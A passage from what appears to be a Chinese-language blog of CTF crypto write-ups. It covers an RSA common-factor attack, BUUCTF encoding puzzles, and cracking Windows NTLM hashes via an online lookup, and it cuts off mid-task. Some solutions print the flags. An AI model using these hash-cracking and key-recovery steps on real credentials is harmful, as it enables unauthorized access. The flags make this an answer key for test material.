class="number">27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299</span></span><br><span class="line">c12 = <span class="number">21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971</span></span><br><span class="line"></span><br><span class="line">n13 = <span class="number">20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551</span></span><br><span class="line">c13 = <span class="number">14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175</span></span><br><span class="line"></span><br><span class="line">n14 = <span class="number">27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987</span></span><br><span class="line">c14 = <span class="number">3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457</span></span><br><span class="line"></span><br><span class="line">n15 = <span class="number">27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837</span></span><br><span class="line">c15 = <span class="number">14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842</span></span><br><span class="line"></span><br><span class="line">n16 = <span class="number">25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451</span></span><br><span class="line">c16 = <span class="number">17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724</span></span><br><span class="line"></span><br><span class="line">n17 = <span class="number">23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499</span></span><br><span class="line">c17 = <span class="number">10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024</span></span><br><span class="line"></span><br><span class="line">n18 = <span class="number">19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973</span></span><br><span class="line">c18 = <span class="number">3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887</span></span><br><span class="line"></span><br><span class="line">n19 = <span class="number">19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603</span></span><br><span class="line">c19 = <span class="number">6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889</span></span><br><span class="line"></span><br><span class="line">n20 = <span class="number">26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659</span></span><br><span class="line">c20 = <span class="number">386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>=[n1,n2,n3,n4,n5,n6,n7,n8,n9,n10,n11,n12,n13,n14,n15,n16,n17,n18,n19,n20]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">list</span>)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">list</span>)):</span><br><span class="line">        <span class="keyword">if</span> i==j:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(i,j)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(gmpy2.gcd(<span class="built_in">list</span>[i],<span class="built_in">list</span>[j]))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;error &quot;</span>,i)</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>透過因數分解拆拆看能不能拆出共同質因數p</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p = 132585806383798600305426957307612567604223562626764190211333136246643723811046149337852966828729052476725552361132437370521548707664977123165279305052971868012755509160408641100548744046621516877981864180076497524093201404558036301820216274968638825245150755772559259575544101918590311068466601618472464832499</span><br></pre></td></tr></table></figure><p>拆出來之後就可以靠p, q來計算d，有了d之後可以進行解密動作。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">p = <span class="number">132585806383798600305426957307612567604223562626764190211333136246643723811046149337852966828729052476725552361132437370521548707664977123165279305052971868012755509160408641100548744046621516877981864180076497524093201404558036301820216274968638825245150755772559259575544101918590311068466601618472464832499</span></span><br><span class="line">q = n18 // p</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c18,d,n18)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure><p>拿到flag，舒服。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF crypto 1</title>
      <link href="/ctf-crypto-buuctf-1/"/>
      <url>/ctf-crypto-buuctf-1/</url>
      
        <content type="html"><![CDATA[<p>感覺CTF題目寫過就忘記，真的要把題解好好寫下來，之後要用到的時候直接查詢就好。<br />記憶力有點靠不住了，然後這邊只會提供做法，盡量不提供flag，不好意思。</p><h2 id="buuctf"><a class="markdownIt-Anchor" href="#buuctf"></a> BUUCTF</h2><p>因為感覺比較油一點就來試試看。</p><h3 id="md5"><a class="markdownIt-Anchor" href="#md5"></a> MD5</h3><p>這題給出e00cf25ad42683b3df678c61f42c6bda這個字串，依據題目來看就是MD5解密。</p><blockquote><p>MD5訊息摘要演算法（MD5 Message-Digest Algorithm），是一種被廣泛使用的密碼雜湊函式，可以產生出一個128位元（16個字元(BYTES)）的雜湊值（hash value），用於確保資訊傳輸完整一致，由美國密碼學家羅納德·李維斯特（Ronald Linn Rivest）設計。</p></blockquote><p>網站提供的是與資料庫內的數據進行比較並解密，畢竟不可能從hash中直接獲得明文。</p><p><a href="https://md5decrypt.net/en/">https://md5decrypt.net/en/</a></p><p>輸入後即可取得flag。</p><h3 id="一眼就解密"><a class="markdownIt-Anchor" href="#一眼就解密"></a> 一眼就解密</h3><p>題目給出的加密字串是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30=</span><br></pre></td></tr></table></figure><p>看到字尾有=可以先盲猜是base64，熟到不能再熟了。<br />decode base64 to ascii編碼之後，得到flag。</p><h3 id="url編碼"><a class="markdownIt-Anchor" href="#url編碼"></a> Url編碼</h3><p>既然提示出是url編碼了，就找一個解url編碼的網站。</p><p><a href="https://www.ifreesite.com/urldecoderencoder.htm">https://www.ifreesite.com/urldecoderencoder.htm</a></p><p>解碼後取得flag。</p><h3 id="看我迴旋踢"><a class="markdownIt-Anchor" href="#看我迴旋踢"></a> 看我迴旋踢</h3><p>題目給出的加密字串是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">synt&#123;5pq1004q-86n5-46q8-o720-oro5on0417r1&#125;</span><br></pre></td></tr></table></figure><p>感覺沒什麼特別的地方，也不是hex等字串的感覺，先盲猜ROT13，然後發現解密出的字串格式是flag{…}，確定取得flag。</p><h3 id="摩絲"><a class="markdownIt-Anchor" href="#摩絲"></a> 摩絲</h3><p>厲害了，直接打開維基百科查詢，對密碼對到眼睛瞎掉。<br />不過比較好的是密碼中間有用空格隔開，不然真的很噁。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.. .-.. --- ...- . -.-- --- ..-</span><br></pre></td></tr></table></figure><p>翻譯過來是I LOVE YOU，提交還要大寫，不要臉。</p><h3 id="password"><a class="markdownIt-Anchor" href="#password"></a> password</h3><p>原本又HxD等等軟體都打不開，想說這到底是什麼，沒想到notepad++直接打開，使用字元集GB2312來進行解碼之後可以觀看。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">姓名：张三 </span><br><span class="line">生日：19900315</span><br><span class="line"></span><br><span class="line">key格式为key&#123;xxxxxxxxxx&#125;</span><br></pre></td></tr></table></figure><p>要填入十個數字，猜測應該是姓名加上生日，但沒想到是縮寫，厲害了羅馬拼音。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;zs19900315&#125;</span><br></pre></td></tr></table></figure><h3 id="變異凱撒"><a class="markdownIt-Anchor" href="#變異凱撒"></a> 變異凱撒</h3><p>原本以為就是ROT13的變形，結果沒想到列出所有組合都怪怪的，然後去找了一下^，確認他在ASCII裡面。</p><p>然後可以看到一些規律。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a+5=f</span><br><span class="line">f+6=l</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>然後直接解碼就好，取得flag。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">caesar</span>(<span class="params">cipher</span>):</span><br><span class="line">    j = <span class="number">5</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(i) + j), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">caesar(<span class="string">&quot;afZ_r9VYfScOeO_UL^RWUc&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="quoted-printable"><a class="markdownIt-Anchor" href="#quoted-printable"></a> Quoted-printable</h3><p>題目給的密文是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=E9=82=A3=E4=BD=A0=E4=B9=9F=E5=BE=88=E6=A3=92=E5=93=A6</span><br></pre></td></tr></table></figure><p>先查詢Quoted-printable是什麼東西，發現維基百科的定義如下。</p><blockquote><p>Quoted-printable或QP encoding，沒有規範的中文譯名，可譯為可列印字元參照編碼或使用可列印字元的編碼。Quoted-printable是使用可列印的ASCII字元（如字母、數字與「=」）表示各種編碼格式下的字元，以便能在7-bit資料通路上傳輸8-bit資料, 或者更一般地說在非8-bit clean媒體上正確處理資料。這被定義為MIME content transfer encoding，用於e-mail。</p></blockquote><p>以此網站進行decoder即可取得flag內容。</p><p><a href="https://www.webatic.com/quoted-printable-convertor">https://www.webatic.com/quoted-printable-convertor</a></p><h3 id="rabbit"><a class="markdownIt-Anchor" href="#rabbit"></a> Rabbit</h3><p>題目給的密文是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">U2FsdGVkX1/+ydnDPowGbjjJXhZxm2MP2AgI</span><br></pre></td></tr></table></figure><p>先查詢Rabbit密碼是什麼東西，網路上的資訊如下。</p><blockquote><p>Rabbit流密碼是由Cryptico公司（<a href="http://www.cryptico.com">http://www.cryptico.com</a> ）設計的，金鑰長度128位，<br />最大加密訊息長度為264 Bytes，即16 TB，若訊息超過該長度，則需要更換金鑰對剩下的訊息進行處理。它是目前安全性較高，加/解密速度比較高效的流密碼之一，在各種處理器平臺上都有不凡的表現。</p></blockquote><p><a href="http://tools.jb51.net/password/rabbit_encode">http://tools.jb51.net/password/rabbit_encode</a></p><p>使用此網站進行解碼即可取得flag。</p><h3 id="籬笆牆的影子"><a class="markdownIt-Anchor" href="#籬笆牆的影子"></a> 籬笆牆的影子</h3><p>題目給的密文是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">felhaagv&#123;ewtehtehfilnakgw&#125;</span><br></pre></td></tr></table></figure><p>題目給出的題示是 :<br />星星還是那顆星星喲<br />月亮還是那個月亮<br />山也還是那座山喲<br />梁也還是那道梁<br />碾子是碾子缸是缸喲<br />爹是爹來娘是娘<br />麻油燈呵還吱吱響<br />點的還是那麼丁點亮<br />哦哦</p><p>完全…看不懂，查詢之後發現是歌詞。</p><p>哭阿，方向完全錯了，這是柵欄密碼。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">felhaagv&#123;ewtehtehfilnakgw&#125;</span><br><span class="line">f l a g &#123; w e t h i n k w</span><br><span class="line"> e h a v e t h e f l a g &#125;</span><br></pre></td></tr></table></figure><p>於是可以用這種簡單的方法解出flag{wethinkwehavetheflag}</p><p>爛死了。</p><h3 id="丟失的md5"><a class="markdownIt-Anchor" href="#丟失的md5"></a> 丟失的MD5</h3><p>題目給出一個py檔。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib   </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            m=hashlib.md5()</span><br><span class="line">            m.update(<span class="string">&#x27;TASC&#x27;</span>+<span class="built_in">chr</span>(i)+<span class="string">&#x27;O3RJMV&#x27;</span>+<span class="built_in">chr</span>(j)+<span class="string">&#x27;WDJKX&#x27;</span>+<span class="built_in">chr</span>(k)+<span class="string">&#x27;ZM&#x27;</span>)</span><br><span class="line">            des=m.hexdigest()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;e9032&#x27;</span> <span class="keyword">in</span> des <span class="keyword">and</span> <span class="string">&#x27;da&#x27;</span> <span class="keyword">in</span> des <span class="keyword">and</span> <span class="string">&#x27;911513&#x27;</span> <span class="keyword">in</span> des:</span><br><span class="line">                <span class="built_in">print</span>(des)</span><br></pre></td></tr></table></figure><p>嘗試運行後發現被提示需要編碼，修正後讓他可以運行。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib   </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            m=hashlib.md5()</span><br><span class="line">            m.update(<span class="built_in">str</span>(<span class="string">&#x27;TASC&#x27;</span>+<span class="built_in">chr</span>(i)+<span class="string">&#x27;O3RJMV&#x27;</span>+<span class="built_in">chr</span>(j)+<span class="string">&#x27;WDJKX&#x27;</span>+<span class="built_in">chr</span>(k)+<span class="string">&#x27;ZM&#x27;</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            des=m.hexdigest()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;e9032&#x27;</span> <span class="keyword">in</span> des <span class="keyword">and</span> <span class="string">&#x27;da&#x27;</span> <span class="keyword">in</span> des <span class="keyword">and</span> <span class="string">&#x27;911513&#x27;</span> <span class="keyword">in</span> des:</span><br><span class="line">                <span class="built_in">print</span>(des)</span><br></pre></td></tr></table></figure><p>執行後獲得</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e9032994dabac08080091151380478a2</span><br></pre></td></tr></table></figure><p>感覺是hex(十六進位)，但丟進去decoder成ascii和base64都不太對的感覺。<br />然後發現自己是笨蛋，題目就說他是MD5，啊我怎麼沒感覺。</p><p>最後發現這就是答案了，哭阿哭阿，我是笨蛋。</p><h3 id="rsa"><a class="markdownIt-Anchor" href="#rsa"></a> RSA</h3><p>p=473398607161，q=4511491，e=17，求解 d</p><p>使用公式解就可以了</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p =gmpy2.mpz(<span class="number">473398607161</span>)</span><br><span class="line">q =gmpy2.mpz(<span class="number">4511491</span>)</span><br><span class="line">e =gmpy2.mpz(<span class="number">17</span>)</span><br><span class="line">phi_n= (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;d is:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> (d)</span><br></pre></td></tr></table></figure><p>拿到flag</p><h3 id="alice與bob"><a class="markdownIt-Anchor" href="#alice與bob"></a> Alice與Bob</h3><p>密碼學歷史中，有兩位知名的傑出人物，Alice和Bob。他們的愛情經過置換和輪加密也難以混淆，即使是沒有身份認證也可以知根知底。就像在數學王國中的素數一樣，孤傲又熱情。下面是一個大整數:98554799767,請分解為兩個素數，分解後，小的放前面，大的放後面，合成一個新的數字，進行md5的32位小寫哈希，提交答案。</p><p>整數n小於256bit，可以透過本地工具爆破成功，直接打開RSATool2v17。</p><p>不然也可以使用線上工具 <a href="http://factordb.com/">http://factordb.com/</a> 查詢。</p><p>爆破結果p = 101999, q = 966233</p><p>以 101999966233 在 <a href="http://www.hiencode.com/hash.html">http://www.hiencode.com/hash.html</a> 這類線上工具進行MD5的hash計算，得到flag。</p><h3 id="rsarsa"><a class="markdownIt-Anchor" href="#rsarsa"></a> rsarsa</h3><p>題目:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Math is cool! Use the RSA algorithm to decode the secret message, c, p, q, and e are parameters for the RSA algorithm.</span><br><span class="line"></span><br><span class="line">p =  9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span><br><span class="line">q =  11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span><br><span class="line">e =  65537</span><br><span class="line">c =  83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span><br><span class="line"></span><br><span class="line">Use RSA to find the secret message</span><br></pre></td></tr></table></figure><p>利用RSATool2v17計算出d</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">d = 56632047571190660567520341028861194862411428416862507034762587229995138605649836960220619903456392752115943299335385163216233744624623848874235303309636393446736347238627793022725260986466957974753004129210680401432377444984195145009801967391196615524488853620232925992387563270746297909112117451398527453977</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">p =  <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q =  <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">c =  <span class="number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line">d = <span class="number">56632047571190660567520341028861194862411428416862507034762587229995138605649836960220619903456392752115943299335385163216233744624623848874235303309636393446736347238627793022725260986466957974753004129210680401432377444984195145009801967391196615524488853620232925992387563270746297909112117451398527453977</span></span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(c, d, n))</span><br></pre></td></tr></table></figure><p>得到flag。</p><h3 id="大帝的密碼武器"><a class="markdownIt-Anchor" href="#大帝的密碼武器"></a> 大帝的密碼武器</h3><p>看到大帝直覺又是凱薩密碼，</p><p>用HxD打開，看到開頭兩個字是PK，應該是zip的標示，加上副檔名.zip之後解壓縮，得到題目。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">公元前一百年，在罗马出生了一位对世界影响巨大的人物，他生前是罗马三巨头之一。他率先使用了一种简单的加密函，因此这种加密方法以他的名字命名。</span><br><span class="line">以下密文被解开后可以获得一个有意义的单词：FRPHEVGL</span><br><span class="line">你可以用这个相同的加密向量加密附件中的密文，作为答案进行提交。</span><br></pre></td></tr></table></figure><p>將FRPHEVGL跑25種ROT之後可以得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FRPHEVGL</span><br><span class="line">GSQIFWHM</span><br><span class="line">HTRJGXIN</span><br><span class="line">IUSKHYJO</span><br><span class="line">JVTLIZKP</span><br><span class="line">KWUMJALQ</span><br><span class="line">LXVNKBMR</span><br><span class="line">MYWOLCNS</span><br><span class="line">NZXPMDOT</span><br><span class="line">OAYQNEPU</span><br><span class="line">PBZROFQV</span><br><span class="line">QCASPGRW</span><br><span class="line">RDBTQHSX</span><br><span class="line">SECURITY</span><br><span class="line">TFDVSJUZ</span><br><span class="line">UGEWTKVA</span><br><span class="line">VHFXULWB</span><br><span class="line">WIGYVMXC</span><br><span class="line">XJHZWNYD</span><br><span class="line">YKIAXOZE</span><br><span class="line">ZLJBYPAF</span><br><span class="line">AMKCZQBG</span><br><span class="line">BNLDARCH</span><br><span class="line">COMEBSDI</span><br><span class="line">DPNFCTEJ</span><br></pre></td></tr></table></figure><p>懶得看哪個是有意義的單詞，直接丟Google翻譯，得到單詞是SECURITY，順便確定只是簡單的ROT13。<br />然後沒找到要加密的密文在哪，後來發現SECURITY也不是密文 = =，查了一下發現大家還會拿到一個密文叫ComeChina，題目感覺出了問題，丟進ROT13，得到flag。</p><h3 id="windows系統密碼"><a class="markdownIt-Anchor" href="#windows系統密碼"></a> Windows系統密碼</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">ctf:1002:06af9108f2e1fecf144e2e8adef09efd:a7fcb22a88038f35a8f39d503e7f0062:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:bef14eee40dffbc345eeb3f58e290d56:::</span><br></pre></td></tr></table></figure><p>從 <a href="https://www.secpulse.com/archives/65256.html">https://www.secpulse.com/archives/65256.html</a> 此篇文章可以看出windows有兩種密碼處理方式，其中NT LAN Manager（NTLM）的格式跟題目給出的格式一樣。</p><p>將06af9108f2e1fecf144e2e8adef09efd和a7fcb22a88038f35a8f39d503e7f0062分別丟入 <a href="https://www.cmd5.com/">https://www.cmd5.com/</a> 後，後者可以得到有意義的flag。</p><h3 id="凱撒替換呵呵"><a class="markdownIt-Anchor" href="#凱撒替換呵呵"></a> 凱撒？替換？呵呵!</h3><p>題目給的密文如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MTHJ&#123;CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO&#125; </span><br></pre></td></tr></table></figure><p>先跑過一遍凱薩密碼，感覺都不像，就改用替換密碼爆破。</p><p>在 <a href="https://quipqiup.com/">https://quipqiup.com/</a> 上輸入密文和已知替換字 MTHJ=flag ，暴力破解後的第一個選項就是flag。</p><h3 id="萌萌噠的八戒"><a class="markdownIt-Anchor" href="#萌萌噠的八戒"></a> 萌萌噠的八戒</h3><p>題目無法解壓縮，用notepad++打開來看，發現是rar，改用rar解壓縮取得題目。</p><p><img src="https://raw.githubusercontent.com/afan0918/afan0918.github.io/main/asset/bajie.jpg" alt="" /></p><p>先看檔案內有沒有flag和隱藏的區塊，檢查之後找不到，圖片左下感覺是密碼。</p><p><a href="http://www.hiencode.com/pigpen.html">http://www.hiencode.com/pigpen.html</a></p><p>照著輸入，取得密碼。</p><h3 id="rsa1"><a class="markdownIt-Anchor" href="#rsa1"></a> RSA1</h3><p>題目給出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 </span><br><span class="line">q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 </span><br><span class="line">dp = 